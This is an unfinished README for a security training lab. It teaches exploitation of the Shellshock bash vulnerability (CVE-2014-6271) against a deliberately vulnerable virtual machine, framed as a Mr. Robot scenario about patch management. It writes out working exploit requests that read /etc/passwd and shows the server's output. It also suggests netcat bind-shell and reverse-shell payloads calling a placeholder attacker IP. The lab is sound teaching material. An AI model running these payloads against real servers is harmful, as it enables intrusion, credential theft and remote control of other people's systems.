# Shellshock and the Importance of Patch Management

Keeping the software you use up to date is one of the most important defensive security measures you can take. A *patch* is the technical term for a software fix, the digital analog to the way you might close the hole in a ripped pair of jeans by using a patch made of fabric. One of the responsibilities of a defensive IT security team, often called *Blue Teams* in cybersecurity parlance, is to monitor any software used by users in their organization and manage the application of security patches to this software, a process known as *patch management*. When a cybersecurity Blue Team fails to implement an effective patch management regiment, attackers will likely have an easier time penetrating the organization's defenses because of out of date software that is simply missing important security fixes.

In this exercise we will take advantage of the lax security posture on an example Web server that is vulnerable to the historical [*Shellshock*](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29) vulnerability. Formally known as [CVE-2014-6271](https://www.cvedetails.com/cve/CVE-2014-6271/), that is, &ldquo;[Common Vulnerabilities and Exposures (CVE)](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures) disclosed in the year 2014 with ID number 6271,&rdquo; this vulnerability was so dangerous that it received a whopping 10 out of 10 on the [Common Vulnerability Scoring System (CVSS)](https://en.wikipedia.org/wiki/Common_Vulnerability_Scoring_System) vulnerability severity rating scheme because of a combination of how easy it is to execute and how damaging a successful exploit attempt could often be. Simply by making a special Web request to a target Web server that is vulnerable to Shellshock, an attacker can execute arbitrary Operating System commands as though they were sitting right at the remote computer's keyboard.

Thus, Shellshock is a great example of a whole class of vulnerabilities known as *command injection* attacks. By better understanding how Shellshock can be exploited, we can better understand the importance of the vital need for quick, effective, and comprehensive patch management since all it would take to close the vulnerability is updating the software involved. Regardless of whether you are responsible for an entire fleet of servers or just your own laptop, Shellshock provides a useful case study for why keeping your software up to date is one of the simplest and most important things you should be doing to stay safe in cyberspace.

1. [Objectives](#objectives)
1. [Bill of materials](#bill-of-materials)
1. [Scenario](#scenario)
1. [Prerequisites](#prerequisites)
1. [Set up](#set-up)
1. [Practice](#practice)
    1. [Introduction](#introduction)
1. [Discussion](#discussion)
1. [Additional references](#additional-references)

# Objectives

> :construction: TK-TODO

# Bill of materials

This folder contains the following files and folders:

* `bin/` - Helper scripts for managing development of this lab. You can safely ignore this unless you want to contribute to the lab itself.
* `cve-2014-6271.iso` - Base disc image containing customized [Tiny Core Linux](https://en.wikipedia.org/wiki/Tiny_Core_Linux) distribution that intentionally ships with a Web server vulnerable to Shellshock.
* `shellshock.box` - [Vagrant Base Box](https://www.vagrantup.com/docs/boxes/base.html) that is built from the files in [this lab's `src` directory](src/).
* `src/` - Source files for building the custom Vagrant Base Box used as the lab environment.
* `README.md` - This file.
* `Vagrantfile` - Vagrant configuration intended to make it easy to bring up the lab environment.

# Scenario

[![Hacking Tyrell Wellick scene, using the `john` password cracker.](https://web.archive.org/web/20161213025246/https://hackertarget.com/mrrobot/wget-shellshock-john.png)](../strengthening-passwords-to-defend-against-john/Mr.%20Robot%20S01E02%20-%20Hacking%20Tyrell%20Wellick.mp4?raw=true)

> Hacking Tyrell Wellick, you'd think it'd be tricky but it wasn't. Evil Corp's corporate mail servers? They haven't patched anything since Shellshock. He doesn't even use two-step verification. His password was just his wife's maiden name and Sweden's independence date, `66`. One "six" away from the obvious, but still. This is bad noob practice.

You are Elliot Alderson, ordinary cybersecurity engineer by day, vigilante hacker by night. In order to uncover Evil Corp's next nefarious plot, you must hack into the corporate email account of their Senior Vice President of Technology, Tyrell Wellick.

In order to break in to the Evil Corp mail server, you must find and exploit a vulnerability on the Web server hosting the Evil Corp webmail application. Fortunately for you, a massively pervasive vulnerability colloquially known as *Shellshock* has recently been disclosed.

Your task is to discern whether or not the Evil Corp mail server is vulnerable to this attack and, if so, exploit it in order to exfiltrate sensitive data belonging to Evil Corp executives: their email account usernames and passwords.

# Prerequisites

To participate in this exercise, you must have:

* A computer running any modern version of:
    * Windows,
    * macOS, or
    * any flavor of the GNU/Linux operating system.
* An active Internet connection (for downloading the required tools in the [set up](#set-up) step; you do not need an Internet connection once you have the tools installed).

> :beginner: :computer: This exercise requires the use of a command line, or "terminal." If you don't know what that means, or if you do but you feel intimidated by that, consider going through [Tech Learning Collective&rsquo;s free, online and self-paced *Foundations: Command Line Basics* course](https://techlearningcollective.com/foundations/), spending an hour at [Apple's Terminal User Guide](https://support.apple.com/guide/terminal/) (for macOS users), [Ubuntu's Command Line for Beginners tutorial](https://ubuntu.com/tutorials/command-line-for-beginners) (for GNU/Linux users) or reviewing [Computer Hope's article, "How to use the Windows command line (DOS)"](http://www.computerhope.com/issues/chusedos.htm) (for Windows users) if you want to get started quickly. You don't need to complete the whole tutorial or article to understand this exercise, but it will dramatically improve your comprehension of this exercise's mechanics. If you want a more thorough but equally gentle introduction to the same material, consider reading (and listening to) [Taming the Terminal](https://www.bartbusschots.ie/s/blog/taming-the-terminal/).

# Set up

In addition to your laptop or desktop computer, you will need to acquire the following tools.

* For managing the virtual machines: [VirtualBox](https://www.virtualbox.org/) version 6.1 or newer, sometimes written as *VBox*.
* For automatically configuring virtual machine settings: [Vagrant](https://vagrantup.com/) version 2.2.7 or newer.

Complete the [Introduction to Virtual Machine Management with Vagrant](../introduction-to-virtual-machine-management-with-vagrant/README.md) practice lab before this one if you do not yet have VirtualBox and Vagrant installed or are unfamiliar with how to use them.

Then, bring the virtual machine(s) for the lab online.

**Do this:**

1. Boot the virtual machine needed for the lab:
    ```sh
    VAGRANT_EXPERIMENTAL="typed_triggers" vagrant up
    ```

Once the target virtual machine is running, you can continue to the next step.

# Practice

We'll begin by ensuring you have successfully completed the [set up](#set-up) steps. This process will also introduce the fundamentals that you need to understand to complete the rest of the exercise.

## Introduction

> :construction: TK-TODO
>
> Notes for exploiting CVE-2014-6271 follow.

The HTTP request, in full, should be at a minimum something like this:

```
GET /cgi-bin/status HTTP/1.0
User-Agent: () { :; }; echo; /bin/cat /etc/passwd
```

Here, `/bin/cat /etc/passwd` is the actual payload, though the entire payload is technically the content of the `User-Agent` HTTP header (`() { :; }; echo; /bin/cat /etc/passwd`). Importantly, spacing matters here because Bash is the program interpreting the syntax of the command sequence. Breaking this down:

* `()` is a Bash syntax idiom indicating that what follows should be a function block. A single space, and only a single space, must follow this part.
* `{` begins the function block. At least one space must follow here, as well, although more than one will also work.
* `:` is the Bash command for a no-operation. This function is therefore defined syntactically correctly, but does nothing. From this point out, spacing no longer affects triggering CVE-2014-6271 so long as your spacing is valid Bash syntax.
* `;` ends the do-nothing function command. (Perhaps unintuitively, this cannot be omitted.)
* `}` ends the function block.
* Since the function block does nothing, we need follow-on commands to execute. To supply follow-on commands, we end the function declaration statement with its own semicolon `;`.
* Now, we supply a payload.

Payload construction also matters, but differs depending on what you are doing.

Our simple payload here begins with `echo` and a statement-ending trailing semicolon (`;`) because our HTTP request is using the `GET` verb, and the output we're constructing (the contents of the `/etc/passwd`) file does not syntactically conform to HTTP headers. This would cause the HTTP sever to issue an HTTP 500 Internal Server Error error code instead of completing the request successfuly. So, we echo a blank line, indicating the end of the HTTP response headers and the beginning of the HTTP response body.

Now we simply print out the contents of the file we want using the full path to the `cat` binary (since it is unlikely that we actually have a `PATH` environment variable in the context of the running Web server), and the path to the file. Classic command injection.

We are not limited to the User-Agent HTTP header, either. Any header we supply will work. The following HTTP request will produce the expected output:

```
GET /cgi-bin/status HTTP/1.0
Blahblah-DoesntMatter: () { :;}; echo; echo "Hacked!"
```

Gives us:

```
HTTP/1.1 200 OK
Date: Fri, 26 Jun 2020 22:04:50 GMT
Server: Apache/2.2.21 (Unix) DAV/2
Connection: close
Content-Type: text/plain

Hacked!
Content-Type: application/json

{ "uptime": " 22:04:51 up 54 min, 1 users, load average: 0.00, 0.01, 0.00", "kernel": "Linux vulnerable 3.14.1-pentesterlab #1 SMP Sun Jul 6 09:16:00 EST 2014 i686 GNU/Linux"}
```

From here, it's simply a matter of figuring out what payload you want and that you can take advantage of in this particular situation. Obvious options include, for instance, a simple bind shell (`nc -l -p 31337 -e /bin/bash`), or a reverse shell (.e.g., `nc <YOUR_IP> 31337 -e /bin/bash`). Be sure to search out bind shell cheat sheets across the Web.

# Discussion

> :construction: TK-TODO

# Additional references

* [Inside Shellshock: How hackers are using it to exploit systems](https://blog.cloudflare.com/inside-shellshock/)
* [PentesterLab.com Shellshock exercise](https://pentesterlab.com/exercises/cve-2014-6271)
